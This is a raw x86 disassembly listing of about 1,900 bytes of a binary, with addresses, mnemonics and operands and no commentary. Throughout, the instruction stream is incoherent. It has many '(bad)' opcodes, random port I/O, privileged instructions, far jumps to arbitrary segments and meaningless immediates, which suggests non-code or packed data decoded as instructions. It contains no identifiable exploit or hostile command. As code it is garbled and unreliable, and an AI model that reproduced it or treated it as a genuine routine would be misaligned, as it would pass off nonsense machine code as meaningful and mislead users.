  422cd9:	test   DWORD PTR [ecx+eax*1-0x773951d3],esi
  422ce0:	jo     0x422d4b
  422ce2:	cmp    bl,bh
  422ce4:	mov    edx,0x199a2e51
  422ce9:	pop    esi
  422cea:	xchg   esi,eax
  422ceb:	sbb    al,0x1b
  422ced:	fsub   QWORD PTR [esi+eiz*2+0x23e5bdc]
  422cf4:	ja     0x422cd3
  422cf6:	das    
  422cf7:	push   ecx
  422cf8:	fbld   TBYTE PTR [ebx-0x46]
  422cfc:	add    eax,0x4e3be0ff
  422d01:	pop    esp
  422d02:	daa    
  422d03:	lds    esp,FWORD PTR fs:[ebp+0x27]
  422d07:	mov    ch,BYTE PTR [edx]
  422d09:	mov    ecx,0x5bfc3e03
  422d0e:	xchg   edx,eax
  422d0f:	and    eax,0xfbde4cf8
  422d14:	or     al,0x2a
  422d16:	in     al,dx
  422d17:	push   cs
  422d18:	mov    cl,0x1a
  422d1a:	bound  esp,QWORD PTR [ecx-0x33]
  422d1d:	in     al,0x70
  422d1f:	repnz xor ch,BYTE PTR [esi-0x639de1d8]
  422d26:	sub    ah,BYTE PTR [ecx+edx*2+0x519f29ce]
  422d2d:	inc    ecx
  422d2e:	xchg   BYTE PTR [edx-0x46bffe39],bh
  422d34:	in     eax,0x9a
  422d36:	das    
  422d37:	(bad)  
  422d38:	not    BYTE PTR [edx+0x1f]
  422d3b:	mov    bh,0xda
  422d3d:	out    dx,eax
  422d3e:	scas   al,BYTE PTR es:[edi]
  422d3f:	sub    esi,DWORD PTR [eax-0x61]
  422d42:	jae    0x422d44
  422d44:	(bad)  
  422d45:	hlt    
  422d46:	out    0xe,eax
  422d48:	xor    edx,DWORD PTR [esi-0x78]
  422d4b:	bound  edi,QWORD PTR fs:[ebp-0x7f]
  422d4f:	or     al,0x89
  422d51:	mov    ecx,0x19a5c1d6
  422d56:	mov    al,0x61
  422d58:	dec    esi
  422d59:	add    eax,eax
  422d5b:	inc    ebp
  422d5c:	jp     0x422db5
  422d5e:	jno    0x422d3e
  422d60:	test   eax,eax
  422d62:	mov    ebx,DWORD PTR [edi-0x6b]
  422d65:	jne    0x422da5
  422d67:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  422d69:	or     al,0x6c
  422d6b:	add    cl,BYTE PTR [ecx+0x28]
  422d6e:	dec    esp
  422d6f:	push   esp
  422d70:	ins    DWORD PTR es:[edi],dx
  422d71:	imul   ebx,DWORD PTR [ecx+0x67],0x8eadd5f9
  422d78:	clc    
  422d79:	les    ecx,FWORD PTR [esi+0x12]
  422d7c:	dec    ecx
  422d7d:	lock ficom DWORD PTR [ebx+0x2b469cc8]
  422d84:	or     eax,0xc8516f20
  422d89:	fadd   st,st(6)
  422d8b:	xor    edx,ebp
  422d8d:	jbe    0x422d28
  422d8f:	loop   0x422d6d
  422d91:	cmp    dl,ch
  422d93:	fwait
  422d94:	push   cs
  422d95:	ret    0x1f7d
  422d98:	sub    BYTE PTR [edi+0x68],ch
  422d9b:	xchg   esi,eax
  422d9c:	loopne 0x422d55
  422d9e:	test   eax,0xaff8dc05
  422da3:	mov    gs,WORD PTR [esi-0x7cd61e57]
  422da9:	sbb    ebx,DWORD PTR [ecx+0x47bc230b]
  422daf:	fidiv  DWORD PTR [edi+0x3dfdb21d]
  422db5:	pop    es
  422db6:	das    
  422db7:	jg     0x422e15
  422db9:	push   eax
  422dba:	add    eax,0x572de8a0
  422dbf:	xor    al,0x17
  422dc1:	test   DWORD PTR [ebx],esp
  422dc3:	shl    BYTE PTR cs:[eax],1
  422dc6:	jmp    0x70b6:0x6c13d2e9
  422dcd:	shl    bl,cl
  422dcf:	fs addr16 out dx,eax
  422dd2:	xor    bh,0x66
  422dd5:	ins    BYTE PTR es:[edi],dx
  422dd6:	mov    al,0xf5
  422dd8:	fs stos DWORD PTR es:[edi],eax
  422dda:	test   DWORD PTR [ecx+0x67],edi
  422ddd:	sbb    eax,0xe6ae0275
  422de2:	test   bh,bl
  422de4:	mov    esp,0x5f5c4969
  422de9:	pop    edi
  422dea:	inc    esi
  422deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dec:	sub    eax,0x5389daae
  422df1:	shrd   DWORD PTR [ebp+0x5bbe9c87],edx,cl
  422df8:	mov    eax,0xf742cd45
  422dfd:	push   eax
  422dfe:	inc    esp
  422dff:	stos   BYTE PTR es:[edi],al
  422e00:	ret    
  422e01:	cmp    eax,0x88ce17b
  422e06:	in     eax,dx
  422e07:	pop    es
  422e08:	out    dx,eax
  422e09:	add    eax,0x7a8fc2f
  422e0e:	jnp    0x422e01
  422e10:	gs push ss
  422e12:	out    dx,eax
  422e13:	adc    esp,esi
  422e15:	inc    edx
  422e16:	push   edx
  422e17:	cli    
  422e18:	sahf   
  422e19:	mov    DWORD PTR [edi-0x48],edx
  422e1c:	cs add esi,edx
  422e1f:	adc    al,0xd3
  422e21:	adc    eax,0x9bf0cba7
  422e26:	cdq    
  422e27:	jl     0x422dcf
  422e29:	jns    0x422dcf
  422e2b:	(bad)  
  422e2d:	xlat   BYTE PTR ds:[ebx]
  422e2e:	mov    edi,0xc7b82cc7
  422e33:	adc    eax,0x64341c0
  422e38:	icebp  
  422e39:	cmp    bh,BYTE PTR fs:[ebp-0x2b2a0a06]
  422e40:	jl     0x422e15
  422e42:	mov    BYTE PTR [ecx+0x3f98f94b],dh
  422e48:	int    0x2f
  422e4a:	adc    al,0xd4
  422e4c:	mov    DWORD PTR ds:0xa79fb7c6,ebx
  422e52:	jnp    0x422eb4
  422e54:	jbe    0x422e25
  422e56:	pop    ebp
  422e57:	cmp    eax,0xe9abe866
  422e5c:	and    bl,BYTE PTR [bx+di+0x59]
  422e60:	inc    esi
  422e61:	fwait
  422e62:	adc    DWORD PTR [edi+0xed7a40b],0x1c
  422e69:	jmp    0x422e94
  422e6b:	fisttp DWORD PTR [esi-0x6a]
  422e6e:	mov    bl,0xac
  422e70:	mov    esp,0xed237a1d
  422e75:	cmp    eax,0x34e0f1e4
  422e7a:	or     BYTE PTR [ecx+0x24],cl
  422e7d:	imul   DWORD PTR [edi-0x22b4ce6c]
  422e83:	mov    ds:0xd1991250,al
  422e88:	shl    dh,1
  422e8a:	iret   
  422e8b:	jo     0x422ec9
  422e8d:	je     0x422e9a
  422e8f:	adc    ah,BYTE PTR [edi+0xc0c253e]
  422e95:	and    edi,DWORD PTR [edx]
  422e97:	outs   dx,DWORD PTR ds:[esi]
  422e99:	and    ch,BYTE PTR [edi-0x48a50c31]
  422e9f:	pop    ecx
  422ea0:	xor    al,0xf7
  422ea2:	push   eax
  422ea3:	jg     0x422e3a
  422ea5:	leave  
  422ea6:	mov    bh,BYTE PTR [ecx+0x7d6e095e]
  422eac:	daa    
  422ead:	fdivrp st(4),st
  422eaf:	icebp  
  422eb0:	sbb    esp,edi
  422eb2:	pop    ecx
  422eb3:	retf   
  422eb4:	or     DWORD PTR [edx],eax
  422eb6:	add    BYTE PTR [ebp+0xccd8733],0xf9
  422ebd:	xchg   esi,eax
  422ebe:	stos   DWORD PTR es:[edi],eax
  422ebf:	sub    dh,cl
  422ec1:	jnp    0x422e76
  422ec3:	lahf   
  422ec4:	out    0x3b,al
  422ec6:	ja     0x422ec9
  422ec8:	stos   BYTE PTR es:[edi],al
  422ec9:	adc    eax,0x4d8ccdb8
  422ece:	inc    esi
  422ecf:	outs   dx,BYTE PTR ds:[esi]
  422ed0:	aam    0x6b
  422ed2:	imul   ecx,DWORD PTR [edi*1+0x2c8aaa9e],0xab429cd9
  422edd:	sbb    DWORD PTR [ecx],esi
  422edf:	in     al,0xfd
  422ee1:	(bad)  
  422ee2:	mov    ebx,0xf34f399
  422ee7:	and    BYTE PTR [ecx],bl
  422ee9:	stos   DWORD PTR es:[edi],eax
  422eea:	sub    cl,BYTE PTR [edx+ebp*1-0xb]
  422eee:	dec    ebx
  422eef:	xor    DWORD PTR [esi+0x1e84d264],0x7af4217b
  422ef9:	scas   eax,DWORD PTR es:[edi]
  422efa:	mov    dh,BYTE PTR [ebp-0x74107b4f]
  422f00:	cwde   
  422f01:	stos   BYTE PTR es:[edi],al
  422f02:	inc    ebx
  422f03:	test   DWORD PTR [edi+0x1],esp
  422f06:	outs   dx,DWORD PTR ds:[esi]
  422f07:	jae    0x422f6a
  422f09:	add    bh,BYTE PTR [eax]
  422f0b:	clc    
  422f0c:	arpl   WORD PTR [esi+esi*8],si
  422f0f:	adc    al,0x9e
  422f11:	div    ah
  422f13:	fwait
  422f14:	or     BYTE PTR [esi-0x20163ed3],dl
  422f1a:	dec    ebx
  422f1b:	xor    edx,ebx
  422f1d:	popa   
  422f1e:	sbb    eax,ebx
  422f20:	shl    ah,1
  422f22:	mov    bh,0xf0
  422f24:	test   al,0x83
  422f26:	or     dh,bl
  422f28:	ins    BYTE PTR es:[edi],dx
  422f29:	adc    al,0xac
  422f2b:	in     eax,dx
  422f2c:	push   es
  422f2d:	ret    0xd1ea
  422f30:	xchg   esp,eax
  422f31:	fs std 
  422f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f34:	cli    
  422f35:	dec    ecx
  422f36:	mov    BYTE PTR [edx],dh
  422f38:	inc    edx
  422f39:	xlat   BYTE PTR ds:[ebx]
  422f3a:	cmp    edx,DWORD PTR [edi]
  422f3c:	je     0x422ec8
  422f3e:	push   esp
  422f3f:	pushf  
  422f40:	push   esp
  422f41:	add    dl,ch
  422f43:	sbb    ah,BYTE PTR [edx+edi*1+0x1cd456d6]
  422f4a:	cld    
  422f4b:	(bad)
  422f4e:	daa    
  422f4f:	add    bl,BYTE PTR [esi-0x3d]
  422f52:	pop    ss
  422f53:	rcr    ah,1
  422f55:	mov    ebp,0x4871a13d
  422f5a:	mov    eax,0xbbfbe891
  422f5f:	lock pop ebp
  422f61:	sti    
  422f62:	or     WORD PTR [eax],cx
  422f65:	and    eax,0xa6d2e0
  422f6a:	xchg   edi,eax
  422f6b:	xchg   ebp,eax
  422f6c:	sbb    DWORD PTR [ebx+eiz*1-0x6c],edi
  422f70:	sti    
  422f71:	xchg   esi,eax
  422f72:	and    BYTE PTR [esi+ebx*8+0x4e],ah
  422f76:	dec    edi
  422f77:	outs   dx,BYTE PTR ds:[esi]
  422f78:	sub    bh,BYTE PTR [ebp+0x3fa61aa4]
  422f7e:	push   cs
  422f7f:	call   0xaaec:0xec0bc451
  422f86:	icebp  
  422f87:	push   ss
  422f88:	mov    cl,0xf5
  422f8a:	or     edx,DWORD PTR [esi-0x53]
  422f8d:	xchg   esi,eax
  422f8e:	or     al,0xe8
  422f90:	xor    eax,0xfbcd3df5
  422f95:	loopne 0x422f60
  422f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f98:	mov    esi,0x43bed251
  422f9d:	ret    
  422f9e:	xchg   DWORD PTR [edi+ebp*2+0x14],edx
  422fa2:	(bad)  
  422fa3:	enter  0x6810,0x22
  422fa7:	mov    bl,0xd
  422fa9:	inc    ebx
  422faa:	push   ecx
  422fab:	mov    al,0xcf
  422fad:	ja     0x42300b
  422faf:	push   esi
  422fb0:	xchg   esi,eax
  422fb1:	xchg   edi,eax
  422fb2:	push   edi
  422fb3:	mov    edx,0x5cf67461
  422fb8:	lods   eax,DWORD PTR ds:[esi]
  422fb9:	add    esi,0x6f
  422fbc:	test   BYTE PTR [ecx+0x1e7cf38],cl
  422fc2:	sbb    BYTE PTR [edx],ch
  422fc4:	aad    0x19
  422fc6:	daa    
  422fc7:	mov    DWORD PTR [eax-0x4d475c93],ebp
  422fcd:	jg     0x423034
  422fcf:	popa   
  422fd0:	cdq    
  422fd1:	enter  0x98b,0x75
  422fd5:	adc    BYTE PTR ds:0xcb28919f,dl
  422fdb:	leave  
  422fdc:	out    dx,eax
  422fdd:	rcr    DWORD PTR [eax+0x1dc65302],0x30
  422fe4:	mov    esi,0x9d48087f
  422fe9:	fisub  WORD PTR [eax-0x5b]
  422fec:	push   edx
  422fed:	push   eax
  422fee:	push   ebx
  422fef:	pop    es
  422ff0:	add    edx,DWORD PTR [eax-0x80]
  422ff3:	jo     0x422faa
  422ff5:	sub    bh,BYTE PTR ds:0x67432e2d
  422ffb:	mov    ss,WORD PTR [ebp+0x18f65a79]
  423001:	outs   dx,BYTE PTR ds:[esi]
  423002:	fld    QWORD PTR [eax-0x317e07b]
  423008:	cmp    dh,BYTE PTR [eax+0x3ae08527]
  42300e:	shl    DWORD PTR [edx-0x42],1
  423011:	xor    ebx,DWORD PTR [edx+esi*8+0x25c6081f]
  423018:	inc    eax
  423019:	pop    edi
  42301a:	xor    BYTE PTR [ebx-0x6f7b989e],0x33
  423021:	popf   
  423022:	nop
  423023:	adc    eax,0x84b3774c
  423028:	add    WORD PTR [edx],bx
  42302b:	pusha  
  42302c:	jecxz  0x422fc3
  42302e:	push   ebp
  42302f:	je     0x42307b
  423031:	sbb    DWORD PTR [ebp+0x7d614741],edi
  423037:	cdq    
  423038:	sbb    al,0xf
  42303a:	xchg   esi,eax
  42303b:	aam    0x65
  42303d:	push   cs
  42303e:	lods   al,BYTE PTR ds:[esi]
  42303f:	push   ebp
  423040:	and    al,0x2c
  423042:	rcr    DWORD PTR [edx],cl
  423044:	jbe    0x4230a9
  423046:	sbb    DWORD PTR [esi+0x4a],ebx
  423049:	adc    eax,0xcc5dc76d
  42304e:	outs   dx,DWORD PTR ds:[esi]
  42304f:	dec    ebp
  423050:	or     BYTE PTR [edi],bl
  423052:	cmp    al,0xa7
  423054:	mov    WORD PTR [ebp+0x3461eb8e],ds
  42305a:	sub    eax,0x58e58f37
  42305f:	popf   
  423060:	cwde   
  423061:	cmp    esp,DWORD PTR [ecx]
  423063:	and    edi,edx
  423065:	push   ebp
  423066:	mov    eax,0xfb2ef6bd
  42306b:	ss jp  0x42307b
  42306e:	test   eax,0xc8d33f47
  423073:	adc    esp,ebp
  423075:	jo     0x42308f
  423077:	push   cs
  423078:	dec    esi
  423079:	jle    0x4230b2
  42307b:	sbb    al,0xe
  42307d:	push   ds
  42307e:	iret   
  42307f:	mov    esp,0x84ee8421
  423084:	out    dx,al
  423085:	add    esi,edx
  423087:	push   ebx
  423088:	jne    0x4230ef
  42308a:	jl     0x42301f
  42308c:	imul   DWORD PTR [edi]
  42308e:	ds push ecx
  423090:	push   eax
  423091:	fisttp DWORD PTR [ecx]
  423093:	into   
  423094:	imul   eax,DWORD PTR fs:[ebx+edi*2+0x34864a04],0xd04bda9d
  4230a0:	sub    BYTE PTR [ebx+edi*4+0xa],dh
  4230a4:	jo     0x4230af
  4230a6:	mov    esi,0x233f293
  4230ab:	adc    al,BYTE PTR [ebp+0x8]
  4230ae:	mov    esp,0x1b0c6be2
  4230b3:	std    
  4230b4:	add    eax,DWORD PTR [eax]
  4230b6:	push   ds
  4230b7:	mov    DWORD PTR [edx-0x5d],edi
  4230ba:	lahf   
  4230bb:	arpl   bp,sp
  4230bd:	push   ebx
  4230be:	xchg   edx,eax
  4230bf:	inc    edx
  4230c0:	push   ecx
  4230c1:	scas   al,BYTE PTR es:[edi]
  4230c2:	cmp    al,0x38
  4230c4:	mov    ecx,0x35ed78b1
  4230c9:	pop    edx
  4230ca:	push   ss
  4230cb:	jp     0x42305c
  4230cd:	xchg   edi,eax
  4230ce:	test   al,0xa
  4230d0:	push   0xfc01e071
  4230d5:	cmp    eax,DWORD PTR [eax-0x79]
  4230d8:	jle    0x4230a9
  4230da:	mov    ebx,0x65835992
  4230df:	popa   
  4230e0:	inc    edx
  4230e1:	bound  ebp,QWORD PTR [esi+0x6a99027]
  4230e7:	mov    al,0x44
  4230e9:	mov    al,ds:0x910d1c65
  4230ee:	xchg   ebx,eax
  4230f0:	mov    WORD PTR [edi+ebp*4],fs
  4230f3:	cmp    dl,BYTE PTR [esi+0x6d290f07]
  4230f9:	sbb    bh,BYTE PTR [edx]
  4230fb:	sti    
  4230fc:	mov    bl,bl
  4230fe:	or     DWORD PTR [eax+0x1],0x6d3e2a3d
  423105:	lock pusha 
  423107:	pop    eax
  423108:	xor    ch,BYTE PTR [ecx+ecx*4-0x39]
  42310c:	fadd   QWORD PTR [ecx-0x56]
  42310f:	retf   
  423110:	sub    BYTE PTR [edx],al
  423112:	cmp    BYTE PTR [ecx-0x18],bl
  423115:	xor    edi,DWORD PTR [ecx-0x4c]
  423118:	imul   ebx,DWORD PTR [ebx],0x79
  42311b:	fisubr WORD PTR [eax+0x63]
  42311e:	fidiv  WORD PTR [ecx-0x58]
  423121:	wbinvd 
  423123:	imul   esi,DWORD PTR ds:0x8faad112,0xd4cf3a9c
  42312d:	or     eax,0x2fb23159
  423132:	std    
  423133:	xchg   ecx,eax
  423134:	jae    0x4230d8
  423136:	aad    0x97
  423138:	pop    ss
  423139:	mov    eax,ds:0x8569fb8c
  42313e:	and    BYTE PTR [ecx-0x25],dl
  423141:	mov    esi,0x4907a46d
  423146:	(bad)  
  423147:	or     BYTE PTR [eax],al
  423149:	xchg   BYTE PTR [edi+ecx*1-0xa],bl
  42314d:	hlt    
  42314e:	push   ebx
  42314f:	dec    dh
  423151:	sti    
  423152:	(bad)  
  423153:	xor    esi,ebp
  423155:	out    0x41,eax
  423157:	pusha  
  423158:	stc    
  423159:	push   ds
  42315a:	popa   
  42315b:	hlt    
  42315c:	pop    ds
  42315d:	arpl   WORD PTR [ebx-0x1b157f1c],bx
  423163:	in     al,0x10
  423165:	push   eax
  423166:	scas   al,BYTE PTR es:[edi]
  423167:	jae    0x4230f1
  423169:	jmp    0xf9a1:0xc787d33a
  423170:	inc    edi
  423171:	jmp    0xad36:0xf66e35fe
  423178:	mov    edx,0x6de6894c
  42317d:	xor    esp,esi
  42317f:	clc    
  423180:	jbe    0x42310e
  423182:	mov    bh,0xf1
  423184:	outs   dx,BYTE PTR ds:[esi]
  423185:	je     0x423116
  423187:	add    BYTE PTR [esi],ah
  423189:	or     eax,0xb2f65d33
  42318e:	pushf  
  42318f:	rcr    BYTE PTR [eax+eax*8],0xc2
  423193:	repz scas eax,DWORD PTR es:[edi]
  423195:	(bad)  
  423196:	fidivr DWORD PTR [esi]
  423198:	adc    edi,edi
  42319a:	push   DWORD PTR [edx]
  42319c:	mov    BYTE PTR [esi+0x24fb956],dl
  4231a2:	outs   dx,BYTE PTR ds:[esi]
  4231a3:	fld    QWORD PTR ds:0xbdc49828
  4231a9:	cs loopne 0x4231f1
  4231ac:	sub    BYTE PTR [edi+0x3e],ch
  4231af:	dec    edx
  4231b0:	scas   eax,DWORD PTR es:[edi]
  4231b1:	sub    ecx,DWORD PTR gs:[ebx-0x78]
  4231b5:	pop    eax
  4231b6:	daa    
  4231b7:	scas   al,BYTE PTR es:[edi]
  4231b8:	into   
  4231b9:	xchg   ebp,eax
  4231ba:	push   edx
  4231bc:	mov    WORD PTR [ecx-0x39],es
  4231bf:	xchg   edx,eax
  4231c0:	xor    bh,BYTE PTR [edi+0x483cc3ae]
  4231c6:	sbb    al,0x29
  4231c8:	je     0x423155
  4231ca:	sar    DWORD PTR [ecx],1
  4231cc:	adc    DWORD PTR [ebp-0x414dd0f5],ebp
  4231d2:	sbb    BYTE PTR [ecx],bl
  4231d4:	dec    esp
  4231d5:	pop    esp
  4231d6:	fild   QWORD PTR [eax+0x1c]
  4231d9:	mov    ds:0x5ff48447,al
  4231de:	ja     0x4231a7
  4231e0:	dec    edx
  4231e1:	std    
  4231e2:	jne    0x423182
  4231e4:	rcr    BYTE PTR [eax-0x47],cl
  4231e7:	aad    0xec
  4231e9:	mov    ah,ch
  4231eb:	in     eax,0xb0
  4231ed:	mov    esp,0x2670ddc8
  4231f2:	jnp    0x4231cb
  4231f4:	jnp    0x42317c
  4231f6:	in     eax,0xe0
  4231f8:	cli    
  4231f9:	leave  
  4231fa:	out    dx,eax
  4231fb:	pop    esi
  4231fc:	pop    ebp
  4231fd:	push   ds
  4231fe:	push   esi
  4231ff:	xchg   ecx,eax
  423200:	pusha  
  423201:	daa    
  423202:	daa    
  423203:	dec    esi
  423204:	cmp    BYTE PTR [edx+ebx*4+0x6a],ch
  423208:	cs and al,0xec
  42320b:	push   ebx
  42320c:	sub    esi,ecx
  42320e:	test   DWORD PTR [eax+esi*2+0x78],ebp
  423212:	(bad)  
  423213:	jecxz  0x4231af
  423215:	xlat   BYTE PTR ds:[ebx]
  423216:	scas   al,BYTE PTR es:[edi]
  423217:	pop    edi
  423218:	in     al,0x93
  42321a:	pop    ebx
  42321b:	jmp    0x423263
  42321d:	fild   WORD PTR [ecx]
  42321f:	push   ss
  423220:	push   ss
  423221:	lods   al,BYTE PTR ds:[esi]
  423222:	dec    esi
  423223:	cmp    ecx,DWORD PTR [eax-0x40]
  423226:	lods   eax,DWORD PTR ds:[esi]
  423227:	xor    BYTE PTR [ebx-0xd],al
  42322a:	dec    edx
  42322b:	dec    eax
  42322c:	cmc    
  42322d:	ror    edi,1
  42322f:	dec    edx
  423230:	pop    es
  423231:	ror    DWORD PTR [esi+0x72],0xe0
  423235:	sub    BYTE PTR [ecx],cl
  423237:	aad    0x30
  423239:	pop    ebx
  42323a:	repz adc esi,DWORD PTR ds:0x7be4288b
  423241:	pusha  
  423242:	fcmovnbe st,st(6)
  423244:	rcl    DWORD PTR [ebp+0x5af7f10b],1
  42324a:	cmp    ah,dl
  42324c:	scas   al,BYTE PTR es:[edi]
  42324d:	pop    eax
  42324e:	xchg   esp,edx
  423250:	pop    ebp
  423251:	push   esp
  423252:	outs   dx,DWORD PTR ds:[esi]
  423253:	mov    edi,0xe86e232a
  423258:	inc    esp
  423259:	test   al,0x54
  42325b:	pop    es
  42325c:	jp     0x42327c
  42325e:	sub    dh,al
  423260:	outs   dx,BYTE PTR ds:[esi]
  423261:	jae    0x4232b2
  423263:	retf   0xf6a9
  423266:	jl     0x423213
  423268:	out    0x8f,al
  42326a:	(bad)  
  42326b:	arpl   WORD PTR [edx],cx
  42326d:	mov    DWORD PTR [ebx],ebp
  42326f:	push   0xffffffca
  423271:	cmc    
  423272:	jle    0x423235
  423274:	into   
  423275:	pop    eax
  423276:	mov    esp,0xd3e33e45
  42327b:	push   esi
  42327c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42327d:	add    esp,DWORD PTR [eax]
  42327f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423280:	xchg   esi,eax
  423281:	pop    edi
  423282:	xlat   BYTE PTR ds:[ebx]
  423283:	mov    ch,0xdf
  423285:	cmp    BYTE PTR [ebp-0x1a],0xe5
  423289:	sbb    bh,BYTE PTR [ebx+0x68e22d23]
  42328f:	scas   eax,DWORD PTR es:[edi]
  423290:	js     0x423288
  423292:	fidiv  WORD PTR [ecx+ebp*4+0x1]
  423296:	not    DWORD PTR [eax-0x27933c48]
  42329c:	pop    ds
  42329d:	sbb    al,0x84
  42329f:	mov    ds:0xfc42509e,al
  4232a4:	push   0x47
  4232a6:	loopne 0x423237
  4232a8:	fbstp  TBYTE PTR [esi+0x7aaa2681]
  4232ae:	or     eax,0xe38fd6e5
  4232b3:	scas   eax,DWORD PTR es:[edi]
  4232b4:	loop   0x423323
  4232b6:	adc    BYTE PTR [ebp-0xadd5e4f],0x6d
  4232bd:	dec    edi
  4232be:	in     eax,0x94
  4232c0:	inc    esi
  4232c1:	shl    BYTE PTR [edx+esi*4],0x11
  4232c5:	mov    ebx,0x3d7dc0d7
  4232ca:	mov    bl,0x29
  4232cc:	mov    ch,0x19
  4232ce:	and    eax,0x41cd40b1
  4232d3:	push   esi
  4232d4:	das    
  4232d5:	push   ebx
  4232d6:	aas    
  4232d7:	adc    BYTE PTR [eax+0x12],al
  4232da:	shl    ebp,0x2c
  4232dd:	out    dx,al
  4232de:	int    0x43
  4232e0:	sub    DWORD PTR [esi-0x651b0575],eax
  4232e6:	jg     0x42335c
  4232e8:	lods   eax,DWORD PTR ds:[esi]
  4232e9:	push   ecx
  4232ea:	dec    esp
  4232eb:	push   ss
  4232ec:	fwait
  4232ed:	mov    al,0xa8
  4232ef:	xor    bl,0x59
  4232f2:	jne    0x42335c
  4232f4:	imul   esi,DWORD PTR [edx],0xd96bdd17
  4232fa:	ins    BYTE PTR es:[edi],dx
  4232fb:	jmp    0x9254af39
  423300:	(bad)  
  423301:	lahf   
  423302:	lahf   
  423303:	das    
  423304:	fisttp QWORD PTR [edx+0x30]
  423307:	test   ecx,0x770def34
  42330d:	fidivr WORD PTR [ecx+0x6f560d79]
  423313:	outs   dx,DWORD PTR ds:[esi]
  423314:	xchg   esp,eax
  423315:	in     al,0xc8
  423317:	push   ss
  423318:	push   ds
  423319:	(bad)  
  42331a:	fisttp QWORD PTR [edx]
  42331c:	push   esi
  42331d:	test   BYTE PTR [eax+0x61ae702],dh
  423323:	test   BYTE PTR [ecx-0x7f473bea],0xd8
  42332a:	add    dl,bl
  42332c:	or     eax,esp
  42332e:	dec    edx
  42332f:	dec    ebx
  423330:	lock and al,0xed
  423333:	xchg   esi,eax
  423334:	shl    DWORD PTR [ecx-0xf],0xf
  423338:	sub    eax,DWORD PTR [ecx-0x4f]
  42333b:	and    dl,ah
  42333d:	jbe    0x4233be
  42333f:	sahf   
  423340:	std    
  423341:	pop    ds
  423342:	callw  0x12aa
  423346:	xchg   edx,eax
  423347:	xor    eax,0x995bbbf6
  42334c:	or     eax,0xea31a5b
  423351:	sbb    dl,BYTE PTR [ecx]
  423353:	mov    al,ds:0x8342127a
  423358:	pop    edi
  423359:	cdq    
  42335a:	outs   dx,DWORD PTR ds:[esi]
  42335b:	stos   BYTE PTR es:[edi],al
  42335c:	mov    BYTE PTR [ebp-0x43],bh
  42335f:	mov    eax,ds:0x448e0ef8
  423364:	jecxz  0x423379
  423366:	jecxz  0x4233e5
  423368:	pop    ebx
  423369:	ins    BYTE PTR es:[edi],dx
  42336a:	fcomp  st(5)
  42336c:	sub    BYTE PTR [eax+0x50e48cca],0x5a
  423373:	mov    ah,0x2f
  423375:	mov    ecx,0x269a4851
  42337a:	push   cs
  42337b:	test   DWORD PTR [edi+0x70],edx
  42337e:	mov    ch,BYTE PTR [ebp+esi*4+0x55]
  423382:	loope  0x4233f7
  423384:	nop
  423385:	fwait
  423386:	adc    edi,DWORD PTR [ebp+0x4d]
  423389:	lds    eax,FWORD PTR [eax+eiz*4+0x1f]
  42338d:	(bad)  
  42338e:	jmp    0x81024922
  423393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423394:	add    esi,DWORD PTR [esi+0x3332130e]
  42339a:	lds    ecx,FWORD PTR [ebx]
  42339c:	xchg   esp,eax
  42339d:	pop    ecx
  42339e:	shl    BYTE PTR ds:0x5caca328,1
  4233a4:	jmp    0x11967000
  4233a9:	dec    esi
  4233aa:	adc    BYTE PTR [eax],dl
  4233ac:	sub    ah,BYTE PTR [esi+0x1c442cde]
  4233b2:	and    eax,0xd38b6034
  4233b7:	(bad)  
  4233b8:	outs   dx,BYTE PTR ds:[esi]
  4233b9:	test   al,0x59
  4233bb:	js     0x4233ab
  4233bd:	repz dec eax
  4233bf:	shl    BYTE PTR ds:[edx-0x73499630],1
  4233c6:	lods   al,BYTE PTR ds:[esi]
  4233c7:	fsub   DWORD PTR [ebp+0x5253206]
  4233cd:	fisub  DWORD PTR [esi]
  4233cf:	mov    al,0xbf
  4233d1:	xor    dl,BYTE PTR [edi]
  4233d3:	push   esi
  4233d4:	lock or eax,0x70c6572b
  4233da:	ins    BYTE PTR es:[edi],dx
  4233db:	pushf  
  4233dc:	sbb    esp,edx
  4233de:	jbe    0x4233da
  4233e0:	out    0x5e,al
  4233e2:	cmp    DWORD PTR [ebx+0x15],0x4c62d7af
  4233e9:	jns    0x423415
  4233eb:	das    
  4233ec:	cmc    
  4233ed:	xchg   esp,eax
  4233ee:	call   0xd4f69af4
  4233f3:	and    ah,cl
  4233f5:	sub    ecx,edi
  4233f7:	jbe    0x423389
  4233f9:	dec    ebp
  4233fa:	aas    
  4233fb:	jle    0x4233bb
  4233fd:	(bad)  
  4233fe:	sub    ebp,DWORD PTR [esi]
  423400:	in     al,0xb6
  423402:	xchg   ebp,eax
  423403:	sub    eax,ebx
  423405:	xlat   BYTE PTR ds:[ebx]
  423406:	push   ebx
  423407:	xlat   BYTE PTR ds:[ebx]
  423408:	test   al,0xae
  42340a:	cmp    edi,DWORD PTR ds:0x9429363a
  423410:	sbb    eax,0x70e40524
  423415:	add    ch,BYTE PTR [ebx+0x6c]
  423418:	outs   dx,DWORD PTR ds:[esi]
  423419:	ror    edx,cl
  42341b:	sti    
  42341c:	add    eax,0xaab788a8
  423421:	cmp    dl,BYTE PTR ds:[eax+0x6d2efa36]
  423428:	(bad)  
  423429:	jmp    0x332f0c7d
  42342e:	cmp    al,0xd9
  423430:	imul   eax,DWORD PTR [eax],0xa80a5b39
  423436:	add    eax,0xe66b6c4a
  42343b:	add    al,0xcc
  42343d:	retf   0xaaac
  423440:	or     al,0x55
  423442:	aaa    
  423443:	xor    esp,esp
  423445:	mov    ebx,0xa0dffc2e
  42344a:	test   DWORD PTR [ebx],eax
  42344c:	dec    esi
  42344d:	(bad)  
  42344e:	push   ds
  42344f:	js     0x42346c
  423451:	mov    edx,0x6fff5ff5
  423456:	adc    eax,0x5592a362
  42345b:	in     eax,dx
  42345c:	in     eax,dx
  42345d:	je     0x42343b
  42345f:	scas   eax,DWORD PTR es:[edi]
  423460:	fs xor eax,0x461e0e1b
  423466:	mov    ah,0x54
  423468:	sub    DWORD PTR [edi],esp
  42346a:	das    
  42346b:	and    ebx,ebp
  42346d:	dec    ebp
  42346e:	xchg   ebp,eax
  42346f:	mov    cl,0x32
  423471:	loopne 0x42346a
  423473:	test   DWORD PTR [edx],ebx
  423475:	or     al,0x50
  423477:	(bad)  
  423478:	jnp    0x423471
  42347a:	dec    esi
